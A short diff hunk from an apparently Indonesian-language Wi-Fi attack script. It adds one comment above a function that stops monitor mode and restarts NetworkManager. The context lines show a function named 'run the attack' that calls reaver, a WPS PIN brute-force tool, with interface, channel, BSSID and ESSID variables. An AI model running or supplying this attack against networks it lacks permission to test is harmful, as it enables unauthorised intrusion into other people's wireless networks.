@@ -162,6 +162,7 @@ function menjalankan_serangan(){
 	reaver -i "${interface}" -c "${channel}" -b "${bssid}" -e "${essid}" -s "${sesi}"
 }
 
+# fungsi untuk menonaktifkan mode monitor pada interface yang sudah diatur
 function menonaktifkan_mode_monitor(){
         airmon-ng stop "${interface}" >> /dev/null 2>&1
 	systemctl restart NetworkManager
